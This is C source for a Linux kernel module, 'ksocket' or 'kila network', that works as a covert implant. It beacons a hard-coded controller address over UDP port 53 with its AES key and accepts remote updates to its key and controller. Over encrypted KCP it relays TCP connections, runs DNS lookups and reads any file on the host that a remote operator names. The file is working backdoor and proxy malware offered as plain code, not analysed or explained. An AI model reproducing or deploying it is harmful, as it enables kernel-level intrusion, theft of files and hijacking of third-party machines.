#define KILA_VERSION 1;
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kthread.h>

#include <linux/errno.h>
#include <linux/types.h>

#include <linux/netdevice.h>
#include <linux/ip.h>
#include <linux/in.h>
#include <linux/time.h>
#include <linux/delay.h>
#include "ikcp.h"
#include "data.h"
#include "hashmap.h"
#include "tcp_client.h"
#include "aes.h"
#include "pkcs7_padding.h"
#include "dns.h"
#include "file.h"

#define DEFAULT_PORT 2444
#define MODULE_NAME "ksocket"
unsigned char dns_server[] = {8,8,8,8,0};
/*
   2021/05/30 - Dear Rodrigo Rubira Branco,you haven't understood udp at all
   - Wooyme

   2006/06/27 - Added ksocket_send, so, after receive a packet, the kernel send another back to the CONNECT_PORT
   - Rodrigo Rubira Branco <rodrigo@kernelhacking.com>

   2006/05/14 - Initial version
   - Toni Garcia-Navarro <topi@phreaker.net>
   */

struct kthread_t
{
    struct task_struct *thread;
    struct socket *sock;
    struct sockaddr_in addr;
    struct msghdr *msghdr;
    int running;
};

struct kthread_t *kthread = NULL;

struct my_node {
    struct my_node *next;
    void *data;
    unsigned long long last_access_time;
};
struct my_client {
    struct socket *sock;
    ikcpcb *kcp;
    struct AES_ctx *aes_ctx;
    char flag;
};
struct kcp_connection {
    ikcpcb *kcp;
    struct socket *sock;
    struct sockaddr_in addr_in;
    struct StrHashTable *sock_table;
};

struct tmp_conn {
    struct my_client *client;
    char ip[4];
    int port;
};
void online(char *ip,int port) {

}
void tmp_create_socket(struct tmp_conn *tmp) {
    struct socket *sock = create_socket(tmp->ip,tmp->port);
    if(tmp->client->flag==3) {
        if(sock!=-1) {
            sock_release(sock);
        }
        kfree(tmp->client);
        kfree(tmp);
        return;
    }
    tmp->client->sock = sock;
    tmp->client->flag = 1;
    printk("Connection finish\n");
    kfree(tmp);
}
/* function prototypes */
char *iv;
char *key;
int ksocket_receive(struct socket *sock, struct msghdr *msghdr, unsigned char *buf, int len);
int ksocket_send(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf, int len);
struct msghdr* ksocket_msghdr(struct sockaddr_in *addr_in);
int udp_output(const unsigned char*,int,ikcpcb *,void*);
void send_to_dns(void *ctx,int size,unsigned char *buf) {
    struct kthread_t *kthread = (struct kthread_t *)ctx;
    struct sockaddr_in addr_in;
    memset(&addr_in,0,sizeof(struct sockaddr_in));
    addr_in.sin_family = AF_INET;
    addr_in.sin_port = htons(53);
    addr_in.sin_addr.s_addr = htonl(create_address(dns_server));

    return ksocket_send(kthread->sock,&addr_in,buf,size);

}
void ikcp_aes_send(ikcpcb *kcp,struct AES_ctx* aes_ctx,char *buf,int size) {
    int encrypted_len = size + 16 - (size % 16);
    pkcs7_padding_pad_buffer(buf,size,encrypted_len,16);
    AES_CBC_encrypt_buffer(aes_ctx,buf,encrypted_len);
    ikcp_send(kcp,buf,encrypted_len);
}
int handle_tcp(char *buf,char *uuid,struct my_client *client) {
    if(client->sock==0) {
        return 0;
    }
    if(client->sock==-1) {
        kfree(client);
        struct IEXCEPTION *exp = kmalloc(sizeof(struct IEXCEPTION),GFP_KERNEL);
        memset(exp,0,sizeof(struct IEXCEPTION));
        exp->flag = EXCEPTION;
        exp->code = 0;
        memcpy(exp->uuid,uuid,36);
        memcpy(exp->msg,"Error in connect",strlen("Error in connect"));
        ikcp_aes_send(client->kcp,client->aes_ctx,exp,sizeof(struct IEXCEPTION));
        kfree(exp);
        return -1;
    }
    if(client->flag==1) {
        client->flag = 0;
        struct ICONNECT_SUCCESS *suc = kmalloc(sizeof(struct ICONNECT_SUCCESS),GFP_KERNEL);
        suc->flag = CONNECT_SUCCESS;
        memcpy(suc->uuid,uuid,36);
        ikcp_aes_send(client->kcp,client->aes_ctx,suc,sizeof(struct ICONNECT_SUCCESS));
        kfree(suc);
    }
    if(client->flag==2) {
        sock_release(client->sock);
        kfree(client);
        return -1;
    }
    int size = tcp_client_receive(client->sock,buf,1000,MSG_DONTWAIT);
    if(size<=0 && size!=-11) {
        struct IEXCEPTION *ex = kmalloc(sizeof(struct IEXCEPTION),GFP_KERNEL);
        memset(ex,0,sizeof(struct IEXCEPTION));
        ex->flag = EXCEPTION;
        ex->code = 1;
        memcpy(ex->uuid,uuid,36);
        memcpy(ex->msg,"Remote close",strlen("Remote close"));
        ikcp_aes_send(client->kcp,client->aes_ctx,ex,sizeof(struct IEXCEPTION));
        sock_release(client->sock);
        //kfree(client->sock);
        kfree(client);
        return -1;
    }
    if(size==-11) {
        return 0;
    }
    struct IRAW *raw = kmalloc(sizeof(struct IRAW),GFP_KERNEL);
    memset(raw,0,sizeof(struct IRAW));
    raw->flag = RAW;
    memcpy(raw->data,buf,size);
    memcpy(raw->uuid,uuid,36);
    raw->size = size;
    ikcp_aes_send(client->kcp,client->aes_ctx,raw,sizeof(struct IRAW));
    kfree(raw);
    return 0;
}
int clear_client(void *nul,char *uuid,struct my_client *client) {
    if(client->sock==0) {
        client->flag = 3;
        return 0;
    }
    if(client->sock!=-1) {
        sock_release(client->sock);
    }
    kfree(client);
    return 0;
}
ikcpcb* init_kcp(IUINT32 conv,struct kcp_connection* kcp_c) {
    ikcpcb *kcp = ikcp_create(conv,kcp_c);
    kcp->output = udp_output;
    printk("conv:%ld\n",conv);
    ikcp_wndsize(kcp,256,256);
    ikcp_nodelay(kcp,1,10,2,1);
    return kcp;
}
static void ksocket_start(void)
{
    char center[5] = {119,3,255,146,0};
    int center_port = 53;
    iv = kmalloc(16,GFP_KERNEL);//{0x05,0x05,0x05,0x05,0x05,0x05,0x05,0x05,0x05,0x05,0x05,0x05,0x05,0x05,0x05,0x05};
    memset(iv,0x05,16);
    key = kmalloc(16,GFP_KERNEL);
    memcpy(key,"B31F2A75FBF94099",16);
    int size, err;
    int bufsize = 1400;
    unsigned char *buf = kmalloc(bufsize+1,GFP_KERNEL);
    struct timespec mytime;
    /* kernel thread initialization */
    lock_kernel();
    kthread->running = 1;
    current->flags |= PF_NOFREEZE;

    /* daemonize (take care with signals, after daemonize() they are disabled) */
    daemonize(MODULE_NAME);
    allow_signal(SIGKILL);
    unlock_kernel();

    /* create a socket */
    if ( ( (err = sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &kthread->sock)) < 0))
    {
        printk(KERN_INFO MODULE_NAME": Could not create a datagram socket, error = %d\n", -ENXIO);
        goto out;
    }

    memset(&kthread->addr, 0, sizeof(struct sockaddr));
    kthread->addr.sin_family      = AF_INET;

    kthread->addr.sin_addr.s_addr      = htonl(INADDR_ANY);

    kthread->addr.sin_port      = htons(DEFAULT_PORT);

    kthread->msghdr = ksocket_msghdr(&kthread->addr);//kmalloc(sizeof(struct msghdr),GFP_KERNEL);

    if ( ( (err = kthread->sock->ops->bind(kthread->sock, (struct sockaddr *)&kthread->addr, sizeof(struct sockaddr) ) ) < 0) )
    {
        printk(KERN_INFO MODULE_NAME": Could not bind or connect to socket, error = %d\n", -err);
        goto close_and_out;
    }
    struct timeval timeout;
    timeout.tv_sec=0;
    timeout.tv_usec=10;
    sock_setsockopt(kthread->sock,SOL_SOCKET,SO_RCVTIMEO,&timeout,sizeof(timeout));
    printk(KERN_INFO MODULE_NAME": listening on port %d\n", DEFAULT_PORT);
    struct my_node * last = 0;
    struct my_node * head=0;
    struct AES_ctx aes_ctx;
    AES_init_ctx_iv(&aes_ctx,key,iv);
    unsigned long long last_online = 0l;
    /* main loop */
    for (;;)
    {
        getnstimeofday(&mytime);
        unsigned long long milltime = mytime.tv_sec*1000l + mytime.tv_nsec/1000000l;
        if(milltime-last_online>10*60*1000) {
	    last_online = milltime;
	    struct IONLINE *online = kmalloc(sizeof(struct IONLINE),GFP_KERNEL);
            memcpy(online->head,"Misaka",strlen("Misaka"));
	    online->version = KILA_VERSION;
	    memcpy(online->key,key,16);
	    struct sockaddr_in addr_in;
            memset(&addr_in,0,sizeof(struct sockaddr_in));
            addr_in.sin_family = AF_INET;
            addr_in.sin_port = htons(center_port);
            addr_in.sin_addr.s_addr = htonl(create_address(center));
            ksocket_send(kthread->sock,&addr_in,online,sizeof(struct IONLINE));
	    kfree(online);
        }
        if(head) {
            struct my_node * curr = head;
            while(curr) {
                ikcp_update(((struct kcp_connection *)(curr->data))->kcp,milltime);
                curr = curr->next;
            }
        }
        memset(buf, 0, bufsize+1);
        size = ksocket_receive(kthread->sock, kthread->msghdr, buf, bufsize);
        if (signal_pending(current))
            break;
        if(size>0 && ntohs(((struct sockaddr_in *)(kthread->msghdr->msg_name))->sin_port)==5353) {
            struct IUPDATE * update = buf;
            memcpy(key,update->key,16);
            AES_init_ctx_iv(&aes_ctx,key,iv);
            memcpy(center,update->ip,4);
            center_port = update->port;
	    continue;
        }
        if(size>0 && ntohs(((struct sockaddr_in *)(kthread->msghdr->msg_name))->sin_port)==53) {
            struct IDNS_SUCCESS *dns = kmalloc(sizeof(struct IDNS_SUCCESS),GFP_KERNEL);
            memset(dns,0,sizeof(struct IDNS_SUCCESS));
            dns->flag = DNS;
            u32 ip = handle_lookup(buf,dns->host);
            dns->size = strlen(dns->host);
            dns->ip=ip;
            if(head) {
                struct my_node *curr = head;
                while(curr) {
                    ikcp_aes_send(((struct kcp_connection *)(curr->data))->kcp,&aes_ctx,dns,sizeof(struct IDNS_SUCCESS));
                    curr = curr->next;
                }
            }
            kfree(dns);
            continue;
        }

        if(size > 0 && buf[0]=='M' && buf[1]=='i' && buf[2]=='s' && buf[3]=='a' && buf[4]=='k' && buf[5]=='a') {
            struct kcp_connection * kcp_c = kmalloc(sizeof(struct kcp_connection),GFP_KERNEL);
            kcp_c->sock = kthread->sock;
            ikcpcb *kcp = init_kcp(*((IUINT32 *)(buf+6)),kcp_c);
            kcp_c->kcp = kcp;
            memcpy(&kcp_c->addr_in,kthread->msghdr->msg_name,sizeof(struct sockaddr_in));
            struct StrHashTable *hashTable = kmalloc(sizeof(struct StrHashTable),GFP_KERNEL);//{{0},NULL,NULL,strhash,uuidcmp};
            memset(hashTable,0,sizeof(struct StrHashTable));
            hashTable->cmp = uuidcmp;
            hashTable->hash = uuidhash;
            kcp_c->sock_table = hashTable;
            ksocket_send(kthread->sock,kthread->msghdr->msg_name,"Misaka",strlen("Misaka"));

            struct my_node* next = kmalloc(sizeof(struct my_node),GFP_KERNEL);
            next->next = 0;
            next->data = kcp_c;
            next->last_access_time = milltime;
            if(last) {
                last->next = next;
                last = next;
            } else {
                head = next;
                last = next;
            }
            //continue;
        }
        if(head) {
            struct my_node* curr = head;
            while(curr) {
                struct kcp_connection *kcp_c = curr->data;
                ikcpcb *kcp = kcp_c->kcp;
                struct StrHashTable *hashTable = kcp_c->sock_table;//get(&kcp_client_table,kcp);
                if(size>0) {
                    if(ikcp_input(kcp,buf,size)==0) {
                        curr->last_access_time = milltime;
                    }
                }
                curr = curr->next;
                while(1) {
                    size = ikcp_recv(kcp,buf,bufsize);
                    if(size<=0) break;
                    /* data processing */
                    if(size==1) {
                        //Heart
                    } else {
                        AES_CBC_decrypt_buffer(&aes_ctx,buf,size);
                        size = pkcs7_padding_data_length(buf,size,16);
                    }
                    char flag = buf[0];
                    if(flag==CONNECT) {
                        struct ICONNECT *iconnect = buf;
                        struct my_client * client = kmalloc(sizeof(struct my_client),GFP_KERNEL);
                        client->sock = 0;
                        client->kcp = kcp;
                        client->aes_ctx = &aes_ctx;
                        struct tmp_conn *tmp = kmalloc(sizeof(struct tmp_conn),GFP_KERNEL);
                        tmp->client = client;
                        memcpy(tmp->ip,iconnect->host,4);
                        tmp->port = iconnect->port;
                        kthread_run(tmp_create_socket,tmp,MODULE_NAME);
                        char *uuid = kmalloc(36,GFP_KERNEL);
                        memcpy(uuid,iconnect->uuid,36);
                        insert(hashTable,uuid,client);
                    } else if(flag==RAW) {
                        struct IRAW *raw = buf;
                        unsigned int conv = kcp->conv;
                        struct my_client *client = get(hashTable,raw->uuid);
                        if(client)
                            tcp_client_send(client->sock,raw->data,raw->size,MSG_WAITALL);
                    } else if(flag==DNS) {
                        struct IDNS*dns = buf;
                        send_lookup(dns->host,T_A,kthread,send_to_dns);
                    } else if(flag==EXCEPTION) {
                        struct IEXCEPTION *e = buf;
                        struct my_client * client = get(hashTable,e->uuid);
                        if(client)
                            client->flag = 2;
                    } else if(flag==HEART) {
                        ikcp_send(kcp,&HEART,1);
                    } else if(flag==FILE_REQ) {
                        struct IFILE_REQ *req = buf;
                        struct IFILE_RES *res = kmalloc(sizeof(struct IFILE_RES),GFP_KERNEL);
                        struct file* filp = file_open(req->filename,O_RDONLY,0);
                        res->flag = FILE_RES;
                        memcpy(res->filename,req->filename,512);
                        res->offset = req->offset;
                        if(filp==0) {
                            res->size = 0;
                            ikcp_aes_send(kcp,&aes_ctx,res,sizeof(struct IFILE_RES));
                        } else {
                            res->size = kernel_read(filp,res->buf,req->size,req->offset);
                            ikcp_aes_send(kcp,&aes_ctx,res,sizeof(struct IFILE_RES));
                        }
                        kfree(res);
                        file_close(filp);
                    } else {
                        //printk("Unexcepted data %c,%d\n",flag,size);
                    }
                }
                if(hashTable) {
                    foreach(hashTable,buf,handle_tcp);
                }
            }

        }
        if(head) {
            struct my_node *curr = head;
            struct my_node *prev = 0;
            while(curr) {
                if(milltime - curr->last_access_time > 10*1000) {
                    struct kcp_connection * kcp_c = curr->data;
                    struct StrHashTable *hashTable = kcp_c->sock_table;
                    if(hashTable) {
                        boom(hashTable,0,clear_client);
                    }
                    ikcp_release(kcp_c->kcp);
                    kfree(kcp_c);
                    if(curr==head) {
                        head = curr->next;
                        kfree(curr);
                        curr = head;
                    } else {
                        prev->next = curr->next;
                        kfree(curr);
                        curr = prev->next;
                    }
                } else {
                    curr = curr->next;
                    prev = curr;
                }
            }
            last = prev;
        }
    }
    //ikcp_release(kcp);
close_and_out:
    sock_release(kthread->sock);
    kthread->sock = NULL;

out:
    kthread->thread = NULL;
    kthread->running = 0;
}

int udp_output(const unsigned char *buf,int len,ikcpcb *kcp,void *context) {
    struct kcp_connection *kcp_c= (struct kcp_connection *)context;
    return ksocket_send(kcp_c->sock,&kcp_c->addr_in,buf,len);
}
int ksocket_send(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf, int len)
{
    struct msghdr msg;
    struct iovec iov;
    mm_segment_t oldfs;
    int size = 0;

    if (sock->sk==NULL)
        return 0;

    iov.iov_base = buf;
    iov.iov_len = len;

    msg.msg_flags = 0;
    msg.msg_name = addr;
    msg.msg_namelen  = sizeof(struct sockaddr_in);
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = NULL;

    oldfs = get_fs();
    set_fs(KERNEL_DS);
    size = sock_sendmsg(sock,&msg,len);
    set_fs(oldfs);

    return size;
}
struct msghdr* ksocket_msghdr(struct sockaddr_in *addr_in) {
    struct msghdr *msg = kmalloc(sizeof(struct msghdr),GFP_KERNEL);
    msg->msg_name = addr_in;
    msg->msg_namelen = sizeof(struct sockaddr_in);
    return msg;
}
int ksocket_receive(struct socket* sock, struct msghdr* msg, unsigned char* buf, int len)
{
    //struct msghdr msg;
    struct iovec iov;
    mm_segment_t oldfs;
    int size = 0;

    if (sock->sk==NULL) return 0;

    iov.iov_base = buf;
    iov.iov_len = len;

    msg->msg_flags = 0;
    msg->msg_control = NULL;
    msg->msg_controllen = 0;
    msg->msg_iov = &iov;
    msg->msg_iovlen = 1;
    msg->msg_control = NULL;

    oldfs = get_fs();
    set_fs(KERNEL_DS);
    size = sock_recvmsg(sock,msg,len,msg->msg_flags);
    set_fs(oldfs);

    return size;
}

int __init ksocket_init(void)
{
    kthread = kmalloc(sizeof(struct kthread_t), GFP_KERNEL);
    memset(kthread, 0, sizeof(struct kthread_t));

    /* start kernel thread */
    kthread->thread = kthread_run((void *)ksocket_start, NULL, MODULE_NAME);
    if (IS_ERR(kthread->thread))
    {
        printk(KERN_INFO MODULE_NAME": unable to start kernel thread\n");
        kfree(kthread);
        kthread = NULL;
        return -ENOMEM;
    }

    return 0;
}

void __exit ksocket_exit(void)
{
    int err;

    if (kthread->thread==NULL)
        printk(KERN_INFO MODULE_NAME": no kernel thread to kill\n");
    else
    {
        lock_kernel();
        err = kill_proc(kthread->thread->pid, SIGKILL, 1);
        unlock_kernel();

        /* wait for kernel thread to die */
        if (err < 0)
            printk(KERN_INFO MODULE_NAME": unknown error %d while trying to terminate kernel thread\n",-err);
        else
        {
            while (kthread->running == 1)
                msleep(10);
            printk(KERN_INFO MODULE_NAME": succesfully killed kernel thread!\n");
        }
    }

    /* free allocated resources before exit */
    if (kthread->sock != NULL)
    {
        sock_release(kthread->sock);
        kthread->sock = NULL;
    }

    kfree(kthread);
    kthread = NULL;

    printk(KERN_INFO MODULE_NAME": module unloaded\n");
}

/* init and cleanup functions */
module_init(ksocket_init);
module_exit(ksocket_exit);

/* module information */
MODULE_DESCRIPTION("kila network");
MODULE_AUTHOR("KILA");
MODULE_LICENSE("GPL");
